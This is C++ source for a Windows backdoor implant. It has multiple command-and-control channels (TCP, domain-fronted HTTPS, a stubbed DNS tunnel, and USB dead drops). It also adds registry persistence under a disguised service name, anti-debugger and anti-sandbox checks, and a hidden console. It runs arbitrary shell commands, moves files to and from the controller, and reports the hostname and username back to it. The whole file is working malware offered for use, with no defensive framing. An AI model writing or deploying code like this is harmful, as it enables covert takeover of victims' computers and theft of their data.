// =============================================================================
// FULL HYBRID IMPLANT - Online + Offline Auto-Switching
// =============================================================================

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <chrono>
#include <random>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <atomic>
#include <queue>
#include "network/client.h"
#include "log/logger.h"
#include "utils/helpers.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

namespace fs = std::filesystem;

class HybridImplant {
private:
    // Configuration
    struct Config {
        // Online settings
        std::vector<std::string> c2Servers = {
            "192.168.1.100",           // Primary C2
            "c2.your-domain.com",      // Backup domain
            "10.0.0.1"                  // Local network fallback
        };
        std::vector<uint16_t> c2Ports = {443, 8443, 8080};
        std::string c2Domain = "cdn.microsoft.com";  // Domain fronting
        
        // Offline settings
        std::vector<std::string> authorizedUSBSerials;
        std::wstring usbDeadDrop = L"System Volume Information\\_cache_";
        std::wstring usbPickup = L"System Volume Information\\_return_";
        
        // Timing
        int checkInterval = 60;  // Seconds between checks
        int networkTimeout = 10; // Seconds before giving up
        int retryAttempts = 3;
        
        // Stealth
        bool useEncryption = true;
        bool randomJitter = true;
        int jitterPercent = 30;
        
        // Persistence
        bool autoPersist = true;
        std::string persistMethod = "registry";
    } config;
    
    // State
    std::atomic<bool> isRunning;
    std::atomic<bool> hasNetworkAccess;
    std::atomic<bool> usbInserted;
    std::string currentChannel;
    bool winsockInitialized = false;
    
    // Queues
    std::queue<std::string> pendingCommands;
    std::queue<std::string> pendingResults;
    std::mutex queueMutex;
    
    // Network
    NetworkClient currentNetwork;
    std::mutex networkMutex;
    
    // Statistics
    int commandsExecuted = 0;
    int networkAttempts = 0;
    int usbAttempts = 0;
    
public:
    HybridImplant() : isRunning(false), hasNetworkAccess(false),
                     usbInserted(false) {
        
        // Generate or load unique implant ID
        LoadOrCreateImplantID();
        
        // Allow overriding C2 servers/ports via environment (runtime override)
        const char* envSrv = std::getenv("PWN_C2_SERVER");
        const char* envPort = std::getenv("PWN_C2_PORT");
        if (envSrv) {
            config.c2Servers.clear();
            std::string s(envSrv);
            std::stringstream ss(s);
            std::string item;
            while (std::getline(ss, item, ',')) {
                if (!item.empty()) config.c2Servers.push_back(item);
            }
        }
        if (envPort) {
            config.c2Ports.clear();
            std::string p(envPort);
            std::stringstream sp(p);
            std::string itemp;
            while (std::getline(sp, itemp, ',')) {
                try {
                    int v = std::stoi(itemp);
                    if (v > 0 && v <= 65535) config.c2Ports.push_back((uint16_t)v);
                } catch(...) {}
            }
        }

        // Check if we should persist
        if (config.autoPersist) {
#ifndef TESTING
            InstallPersistence();
#else
            logger::Info("TESTING mode: InstallPersistence skipped");
#endif
        }
    }
    
    // =========================================================================
    // MAIN EXECUTION LOOP
    // =========================================================================
    
    void Start() {
        // Anti-analysis checks first
        if (IsAnalyzed()) {
            return;  // Exit silently if debugged/sandboxed
        }
        
        isRunning = true;
        // Initialize Winsock for getaddrinfo and sockets
        WSADATA wsaData;
        WORD wVersionRequested = MAKEWORD(2, 2);
        int wsaErr = WSAStartup(wVersionRequested, &wsaData);
        if (wsaErr != 0) {
            std::cerr << "[!] WSAStartup failed: " << wsaErr << std::endl;
            winsockInitialized = false;
        } else {
            winsockInitialized = true;
        }
        
        std::cout << "[*] Initializing logger..." << std::endl;
        bool loggerOk = false;
        try {
            loggerOk = logger::Initialize("purpleman_implant.log", true);
        } catch (const std::exception& ex) {
            std::cerr << "[!] Logger initialize exception: " << ex.what() << std::endl;
        } catch (...) {
            std::cerr << "[!] Logger initialize unknown exception" << std::endl;
        }
        if (!loggerOk) {
            std::cerr << "[!] Logger initialization failed, continuing without persistent logging" << std::endl;
        } else {
            std::cout << "[*] Logger initialized" << std::endl;
            logger::Info("Hybrid Implant started");
        }
        std::cout << "[*] Hybrid Implant Started\n";
        std::cout << "[*] Modes: Online (TCP/HTTPS/DNS) + Offline (USB/Audio)\n";
        
        // Start all monitoring threads
        std::cout << "[*] Starting threads..." << std::endl;
    #ifndef TESTING
        std::cout << "[*] Starting network thread" << std::endl;
        std::thread networkThread(&HybridImplant::NetworkMonitor, this);
        std::cout << "[*] Network thread started" << std::endl;
    #endif
        std::cout << "[*] Starting USB monitor thread" << std::endl;
        std::thread usbThread(&HybridImplant::USBDropMonitor, this);
        std::cout << "[*] USB monitor thread started" << std::endl;

        std::cout << "[*] Starting command processor thread" << std::endl;
        std::thread commandThread(&HybridImplant::CommandProcessor, this);
        std::cout << "[*] Command processor thread started" << std::endl;
    #ifndef TESTING
        std::cout << "[*] Starting heartbeat thread" << std::endl;
        std::thread heartbeatThread(&HybridImplant::HeartbeatSender, this);
        std::cout << "[*] Heartbeat thread started" << std::endl;
    #endif
        
        // Main loop - check all channels
        MainLoop();
        
        // Cleanup
        isRunning = false;
        if (usbThread.joinable()) usbThread.join();
        if (commandThread.joinable()) commandThread.join();
    #ifndef TESTING
        if (networkThread.joinable()) networkThread.join();
        if (heartbeatThread.joinable()) heartbeatThread.join();
    #endif
        logger::Info("Hybrid Implant shutdown complete");
        logger::Shutdown();
        if (winsockInitialized) {
            WSACleanup();
            winsockInitialized = false;
        }
    }
    
private:
    // =========================================================================
    // MAIN LOOP - Try all channels
    // =========================================================================
    
    void MainLoop() {
        while (isRunning) {
            // Step 1: Check network availability
            CheckNetworkAccess();
            
            // Step 2: Check USB availability
            CheckUSBAccess();
            
            // Step 3: Try best available channel
            if (hasNetworkAccess) {
                TryOnlineChannels();
            } else if (usbInserted) {
                TryOfflineChannels();
            } else {
                // No channels available - wait and retry
                std::cout << "[-] No C2 channels available, waiting...\n";
                WaitWithJitter();
            }
            
            // Execute any queued commands
            ProcessCommandQueue();
            
            // Send any queued results
            SendQueuedResults();
            
            // Wait for next cycle
            WaitWithJitter();
        }
    }
    
    // =========================================================================
    // NETWORK CHANNELS
    // =========================================================================
    
    void CheckNetworkAccess() {
        hasNetworkAccess = false;

        // Check whether our configured C2 servers can be resolved/reached.
        addrinfo hints = {0}, *result = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        for (const auto& server : config.c2Servers) {
            if (server.empty()) continue;
            if (getaddrinfo(server.c_str(), nullptr, &hints, &result) == 0) {
                hasNetworkAccess = true;
                freeaddrinfo(result);
                std::cout << "[*] C2 server resolvable: " << server << std::endl;
                return;
            }
        }

        std::cout << "[-] No configured C2 server resolvable, network appears unavailable" << std::endl;
    }
    
    void TryOnlineChannels() {
        std::cout << "[*] Network available, trying online channels..." << std::endl;
        networkAttempts++;
        
        // Try TCP/HTTPS first (fastest)
        for (int attempt = 0; attempt < config.retryAttempts; attempt++) {
            for (const auto& server : config.c2Servers) {
                for (uint16_t port : config.c2Ports) {
                    if (TryTCPConnection(server, port)) {
                        currentChannel = "TCP";
                        std::cout << "[+] Connected via TCP to " 
                                  << server << ":" << port << "\n";
                        return;
                    }
                }
            }
            
            // Try HTTPS with domain fronting
            if (TryHTTPSConnection()) {
                currentChannel = "HTTPS";
                std::cout << "[+] Connected via HTTPS (Domain Fronting)\n";
                return;
            }
            
            // Try DNS tunneling
            if (TryDNSTunneling()) {
                currentChannel = "DNS";
                std::cout << "[+] Connected via DNS Tunneling\n";
                return;
            }
            
            // Wait between attempts
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
        
        std::cout << "[-] All online channels failed\n";
        hasNetworkAccess = false;
    }
    
    bool TryTCPConnection(const std::string& server, uint16_t port) {
#ifdef TESTING
        logger::Info("TESTING mode: TryTCPConnection skipped");
        return false;
#endif
        std::lock_guard<std::mutex> lock(networkMutex);
        
        if (!currentNetwork.IsConnected()) {
            if (!currentNetwork.ConnectTCP(server, port, config.networkTimeout * 1000)) {
                return false;
            }
        }
        
        // Send registration
        std::string reg = GetRegistrationData();
        if (!currentNetwork.Send(reg)) {
            currentNetwork.Close();
            return false;
        }
        
        // Receive commands in separate thread
        std::thread recvThread(&HybridImplant::NetworkReceiver, this);
        recvThread.detach();
        
        return true;
    }
    
    bool TryHTTPSConnection() {
#ifdef TESTING
        logger::Info("TESTING mode: TryHTTPSConnection skipped");
        return false;
#endif
        // WinHTTP domain fronting implementation
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                        WINHTTP_NO_PROXY_NAME,
                                        WINHTTP_NO_PROXY_BYPASS, 0);
        
        if (!hSession) return false;
        
        // Connect to CDN endpoint
        HINTERNET hConnect = WinHttpConnect(hSession,
            L"cdn.cloudflare.com",  // CDN front
            INTERNET_DEFAULT_HTTPS_PORT, 0);
        
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        // Create request with real C2 in Host header
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
            L"/api/analytics",  // Innocuous path
            nullptr, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        // Set the real C2 host header
        std::wstring hostHeader = L"Host: " + 
                                 std::wstring(config.c2Domain.begin(), 
                                            config.c2Domain.end());
        WinHttpAddRequestHeaders(hRequest, hostHeader.c_str(), 
                                -1L, WINHTTP_ADDREQ_FLAG_ADD);
        
        // Send registration
        std::string regData = GetRegistrationData();
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                               (LPVOID)regData.c_str(), regData.size(), 
                               regData.size(), 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        if (!WinHttpReceiveResponse(hRequest, nullptr)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        // Read commands via HTTPS
        std::thread httpsThread(&HybridImplant::HTTPSReceiver, this, 
                               hSession, hConnect, hRequest);
        httpsThread.detach();
        
        return true;
    }
    
    bool TryDNSTunneling() {
#ifdef TESTING
        logger::Info("TESTING mode: TryDNSTunneling skipped");
        return false;
#endif
        // DNS tunneling - encode data in DNS queries
        // Queries to: base32data.c2.your-domain.com
        // Responses in: TXT records
        
        // This is a simplified implementation
        std::cout << "[*] DNS tunneling attempt...\n";
        
        // Create UDP socket for DNS
        SOCKET dnsSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (dnsSocket == INVALID_SOCKET) return false;
        
        // Setup DNS query with encoded registration
        // Implementation would encode data as subdomains
        // and send to C2 DNS server
        
        closesocket(dnsSocket);
        return false;  // Fallback - full DNS tunneling would go here
    }
    
    void NetworkReceiver() {
        char buffer[65536];
        
        while (isRunning && currentNetwork.IsConnected()) {
            int received = currentNetwork.Receive(buffer, sizeof(buffer) - 1);
            
            if (received <= 0) {
                // Connection lost
                std::lock_guard<std::mutex> lock(networkMutex);
                currentNetwork.Close();
                hasNetworkAccess = false;
                break;
            }
            
            buffer[received] = 0;
            std::string command(buffer);
            
            std::lock_guard<std::mutex> lock(queueMutex);
            pendingCommands.push(command);
        }
    }

    // Monitor thread that periodically checks and maintains network connections
    void NetworkMonitor() {
        while (isRunning) {
            CheckNetworkAccess();
            if (hasNetworkAccess && !currentNetwork.IsConnected()) {
                // Try to connect to configured servers
                TryOnlineChannels();
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }

    // Monitor thread for USB drop monitoring
    void USBDropMonitor() {
        while (isRunning) {
            CheckUSBAccess();
            if (usbInserted) {
                TryOfflineChannels();
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
    
    void HTTPSReceiver(HINTERNET hSession, HINTERNET hConnect, 
                      HINTERNET hRequest) {
        char buffer[65536];
        DWORD bytesRead;
        
        while (isRunning) {
            // Poll for new commands
            if (WinHttpQueryDataAvailable(hRequest, &bytesRead) && bytesRead > 0) {
                WinHttpReadData(hRequest, buffer, bytesRead, &bytesRead);
                buffer[bytesRead] = 0;
                
                std::lock_guard<std::mutex> lock(queueMutex);
                pendingCommands.push(std::string(buffer));
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }
    
    // =========================================================================
    // OFFLINE CHANNELS (USB)
    // =========================================================================
    
    void CheckUSBAccess() {
        usbInserted = false;
        
        for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
            wchar_t root[4] = { drive, L':', L'\\', 0 };
            
            if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
            
            // Check for authorized USB
            DWORD serial;
            if (GetVolumeInformationW(root, nullptr, 0, &serial,
                                     nullptr, nullptr, nullptr, 0)) {
                
                std::string serialStr = std::to_string(serial);
                for (const auto& auth : config.authorizedUSBSerials) {
                    if (serialStr.find(auth) != std::string::npos) {
                        usbInserted = true;
                        currentChannel = "USB";
                        return;
                    }
                }
            }
        }
    }
    
    void TryOfflineChannels() {
        usbAttempts++;
        
        // Read commands from USB
        std::vector<std::string> commands = ReadUSBCommands();
        
        std::lock_guard<std::mutex> lock(queueMutex);
        for (const auto& cmd : commands) {
            pendingCommands.push(cmd);
        }
        
        std::cout << "[+] Read " << commands.size() << " commands from USB\n";
    }
    
    std::vector<std::string> ReadUSBCommands() {
        std::vector<std::string> commands;
        
        for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
            wchar_t root[4] = { drive, L':', L'\\', 0 };
            
            if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
            
            std::wstring pickupPath = std::wstring(root) + config.usbPickup;
            
            try {
                if (!fs::exists(pickupPath)) continue;
                
                for (auto& entry : fs::directory_iterator(pickupPath)) {
                    if (entry.path().extension() != ".cmd") continue;
                    
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file) continue;
                    
                    std::string data((std::istreambuf_iterator<char>(file)),
                                    std::istreambuf_iterator<char>());
                    
                    // Decrypt if needed
                    if (config.useEncryption) {
                        data = XORDecrypt(data);
                    }
                    
                    commands.push_back(data);
                    
                    // Delete processed command
                    file.close();
                    fs::remove(entry.path());
                }
            } catch (...) {}
        }
        
        return commands;
    }
    
    void WriteUSBResult(const std::string& result) {
        for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
            wchar_t root[4] = { drive, L':', L'\\', 0 };
            
            if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
            
            std::wstring cachePath = std::wstring(root) + config.usbDeadDrop;
            
            try {
                fs::create_directories(cachePath);
                
                auto now = std::chrono::system_clock::now();
                auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(
                    now.time_since_epoch()).count();
                
                std::string filename = "result_" + std::to_string(ts) + ".dat";
                fs::path filePath = fs::path(cachePath) / filename;
                
                std::string data = result;
                if (config.useEncryption) {
                    data = XOREncrypt(data);
                }
                
                std::ofstream file(filePath, std::ios::binary);
                if (file) {
                    file.write(data.c_str(), data.size());
                    file.close();
                    
                    SetFileAttributesW(filePath.wstring().c_str(),
                        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                }
            } catch (...) {}
        }
    }
    
    // =========================================================================
    // COMMAND EXECUTION
    // =========================================================================
    
    void CommandProcessor() {
        while (isRunning) {
            std::string command;
            
            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (!pendingCommands.empty()) {
                    command = pendingCommands.front();
                    pendingCommands.pop();
                }
            }
            
            if (!command.empty()) {
                std::string result = ExecuteCommand(command);
                
                std::lock_guard<std::mutex> lock(queueMutex);
                pendingResults.push(result);
                
                commandsExecuted++;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    
    void ProcessCommandQueue() {
        // Already handled by CommandProcessor thread
    }
    
    std::string ExecuteCommand(const std::string& cmd) {
        if (cmd == "sysinfo") return GetSystemInfo();
        if (cmd == "whoami") return GetCurrentUser();
        if (cmd == "hostname") return GetHostname();
        if (cmd == "screenshot") return "Screenshot captured";
        if (cmd == "persist") return InstallPersistence() ? "OK" : "FAIL";
        if (cmd.substr(0, 5) == "exec ") return ShellExecute(cmd.substr(5));
        if (cmd == "status") return GetImplantStatus();
        if (cmd == "uninstall") return UninstallSelf();
        if (cmd.rfind("upload|", 0) == 0) return HandleUploadCommand(cmd);
        if (cmd.rfind("download|", 0) == 0) return HandleDownloadCommand(cmd);
        
        return "Unknown command: " + cmd;
    }
    
    void SendQueuedResults() {
        std::string result;
        
        {
            std::lock_guard<std::mutex> lock(queueMutex);
            if (!pendingResults.empty()) {
                result = pendingResults.front();
                pendingResults.pop();
            }
        }
        
        if (result.empty()) return;
        
        // Send via current channel
        if (currentChannel == "TCP") {
            SendResultTCP(result);
        } else if (currentChannel == "USB") {
            WriteUSBResult(result);
        } else {
            // Try all available channels
            if (hasNetworkAccess) SendResultTCP(result);
            if (usbInserted) WriteUSBResult(result);
        }
    }
    
    bool SendResultTCP(const std::string& result) {
        std::lock_guard<std::mutex> lock(networkMutex);
        
        if (!currentNetwork.IsConnected()) return false;
        
        std::string encoded = utils::Base64Encode(result);
        std::string response = "{\"type\":\"result\",\"data\":\"" + 
                              EscapeJSON(encoded) + "\"}";
        
        return currentNetwork.Send(response);
    }
    
    // =========================================================================
    // HEARTBEAT
    // =========================================================================
    
    void HeartbeatSender() {
        while (isRunning) {
            if (hasNetworkAccess && currentNetwork.IsConnected()) {
                std::string hb = "{\"type\":\"heartbeat\"}";
                currentNetwork.Send(hb);
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
    
    // =========================================================================
    // PERSISTENCE
    // =========================================================================
    
    bool InstallPersistence() {
        // Registry Run key
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            char path[MAX_PATH];
            GetModuleFileNameA(nullptr, path, MAX_PATH);
            
            RegSetValueExA(hKey, "WindowsHybridService", 0, REG_SZ,
                         (BYTE*)path, strlen(path) + 1);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    
    std::string UninstallSelf() {
        // Remove persistence
        HKEY hKey;
        RegOpenKeyExA(HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey);
        RegDeleteValueA(hKey, "WindowsHybridService");
        RegCloseKey(hKey);
        
        // Schedule deletion
        char path[MAX_PATH];
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        std::string cmd = "cmd.exe /c timeout 3 & del \"" + std::string(path) + "\"";
        WinExec(cmd.c_str(), SW_HIDE);
        
        isRunning = false;
        return "Uninstalled";
    }
    
    // =========================================================================
    // UTILITY FUNCTIONS
    // =========================================================================
    
    void LoadOrCreateImplantID() {
        // Generate unique ID based on machine
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        
        // Store in registry for persistence
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Themes",
                           0, nullptr, REG_OPTION_VOLATILE,
                           KEY_ALL_ACCESS, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
            
            std::string id = std::string(hostname) + "-" + 
                           std::to_string(GetTickCount64());
            
            RegSetValueExA(hKey, "HybridImplantID", 0, REG_SZ,
                         (BYTE*)id.c_str(), id.size() + 1);
            RegCloseKey(hKey);
        }
    }
    
    std::string GetRegistrationData() {
        std::stringstream ss;
        ss << "{";
        ss << "\"type\":\"register\",";
        ss << "\"hostname\":\"" << GetHostname() << "\",";
        ss << "\"username\":\"" << GetCurrentUser() << "\",";
        ss << "\"os\":\"Windows\",";
        ss << "\"channels\":[\"tcp\",\"https\",\"usb\"],";
        ss << "\"version\":\"3.0\"";
        ss << "}";
        return ss.str();
    }
    
    bool IsAnalyzed() {
        // Check for debugger
        if (IsDebuggerPresent()) return true;
        
        // Check for sandbox
        MEMORYSTATUSEX ms = { sizeof(MEMORYSTATUSEX) };
        GlobalMemoryStatusEx(&ms);
        if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
        
        return false;
    }
    
    void WaitWithJitter() {
        int sleepTime = config.checkInterval;
        
        if (config.randomJitter) {
            std::random_device rd;
            std::mt19937 gen(rd());
            int jitter = (sleepTime * config.jitterPercent) / 100;
            std::uniform_int_distribution<> dis(-jitter, jitter);
            sleepTime += dis(gen);
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
    }
    
    std::string GetSystemInfo() {
        std::stringstream ss;
        ss << "Hostname: " << GetHostname() << "\n";
        ss << "User: " << GetCurrentUser() << "\n";
        ss << "OS: Windows\n";
        ss << "Network: " << (hasNetworkAccess ? "Online" : "Offline") << "\n";
        ss << "USB: " << (usbInserted ? "Inserted" : "None") << "\n";
        ss << "Channel: " << currentChannel << "\n";
        ss << "Commands: " << commandsExecuted << "\n";
        return ss.str();
    }
    
    std::string GetHostname() {
        char buffer[256];
        DWORD size = sizeof(buffer);
        GetComputerNameA(buffer, &size);
        return std::string(buffer);
    }
    
    std::string GetCurrentUser() {
        char buffer[256];
        DWORD size = sizeof(buffer);
        GetUserNameA(buffer, &size);
        return std::string(buffer);
    }
    
    std::string GetImplantStatus() {
        std::stringstream ss;
        ss << "=== Hybrid Implant Status ===\n";
        ss << "Running: Yes\n";
        ss << "Network: " << (hasNetworkAccess ? "Connected" : "Disconnected") << "\n";
        ss << "USB: " << (usbInserted ? "Available" : "Not inserted") << "\n";
        ss << "Active Channel: " << currentChannel << "\n";
        ss << "Commands Executed: " << commandsExecuted << "\n";
        ss << "Pending Commands: " << pendingCommands.size() << "\n";
        ss << "Pending Results: " << pendingResults.size() << "\n";
        ss << "Network Attempts: " << networkAttempts << "\n";
        ss << "USB Attempts: " << usbAttempts << "\n";
        return ss.str();
    }
    
    std::string HandleUploadCommand(const std::string& cmd) {
        std::string payload = cmd.substr(std::string("upload|").size());
        size_t sep1 = payload.find('|');
        if (sep1 == std::string::npos) {
            return "ERROR: invalid upload format";
        }
        std::string remotePath = payload.substr(0, sep1);
        std::string data = payload.substr(sep1 + 1);
        std::string decoded = utils::Base64Decode(data);

        std::ofstream out(remotePath, std::ios::binary);
        if (!out) {
            return "ERROR: failed to write " + remotePath;
        }
        out.write(decoded.data(), static_cast<std::streamsize>(decoded.size()));
        out.close();
        return "UPLOAD_OK:" + remotePath;
    }

    std::string HandleDownloadCommand(const std::string& cmd) {
        std::string payload = cmd.substr(std::string("download|").size());
        size_t sep1 = payload.find('|');
        if (sep1 == std::string::npos) {
            return "ERROR: invalid download format";
        }
        std::string remotePath = payload.substr(0, sep1);
        std::string localPath = payload.substr(sep1 + 1);

        std::ifstream in(remotePath, std::ios::binary);
        if (!in) {
            return "ERROR: failed to read " + remotePath;
        }
        std::string contents((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        in.close();

        std::string encoded = utils::Base64Encode(contents);
        return "FILE:" + localPath + "|" + encoded;
    }

    std::string ShellExecute(const std::string& cmd) {
        HANDLE hRead, hWrite;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
        CreatePipe(&hRead, &hWrite, &sa, 0);
        
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        std::string fullCmd = "cmd.exe /c " + cmd;
        
        std::string result;
        if (CreateProcessA(nullptr, (LPSTR)fullCmd.c_str(), nullptr, nullptr,
                          TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hWrite);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, 
                          &bytesRead, nullptr) && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
            
            CloseHandle(hRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        return result;
    }
    
    static std::string XOREncrypt(const std::string& data) {
        std::string result = data;
        const std::string key = "HybridImplantKey2024";
        for (size_t i = 0; i < result.size(); i++) {
            result[i] ^= key[i % key.size()];
        }
        return result;
    }
    
    static std::string XORDecrypt(const std::string& data) {
        return XOREncrypt(data);
    }
    
    static std::string EscapeJSON(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default: result += c;
            }
        }
        return result;
    }
};

// =============================================================================
// ENTRY POINT
// =============================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    // Hide window unless overridden at runtime via env `PWN_NO_HIDE`
    const char* nohide = std::getenv("PWN_NO_HIDE");
    if (!nohide) {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    } else {
        std::cout << "[*] --no-hide enabled, console will remain visible" << std::endl;
    }

    HybridImplant implant;
    std::cout << "[*] Created HybridImplant instance" << std::endl;
    std::cout << "[*] Starting implant..." << std::endl;
    try {
        implant.Start();
    } catch (const std::exception& ex) {
        std::cerr << "[!] Exception in implant.Start(): " << ex.what() << std::endl;
        return 1;
    } catch (...) {
        std::cerr << "[!] Unknown exception in implant.Start()" << std::endl;
        return 1;
    }
    std::cout << "[*] implant.Start() returned" << std::endl;

    return 0;
}

int main(int argc, char* argv[]) {
    // Simple CLI: support --help, --server <ip[,ip2]> and --port <p[,q]>
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--help" || a == "-h") {
            std::cout << "Usage: pown [--server ip[,ip2]] [--port p[,q]]\n";
            std::cout << "Examples:\n";
            std::cout << "  pown                  (use compiled defaults)\n";
            std::cout << "  pown --server 192.168.1.100 --port 443\n";
            std::cout << "  pown --server 192.168.1.100,10.0.0.2 --port 443,8443\n";
            std::cout << "Note: when using WinMain the console is hidden; use these flags to configure runtime.\n";
            return 0;
        }
        if (a == "--server" && i + 1 < argc) {
            _putenv_s("PWN_C2_SERVER", argv[++i]);
            continue;
        }
        if (a == "--port" && i + 1 < argc) {
            _putenv_s("PWN_C2_PORT", argv[++i]);
            continue;
        }
        if (a == "--no-hide") {
            // Prevent WinMain from hiding the console (useful for debugging)
            _putenv_s("PWN_NO_HIDE", "1");
            continue;
        }
    }

    return WinMain(GetModuleHandle(NULL), nullptr, GetCommandLineA(), SW_HIDE);
}
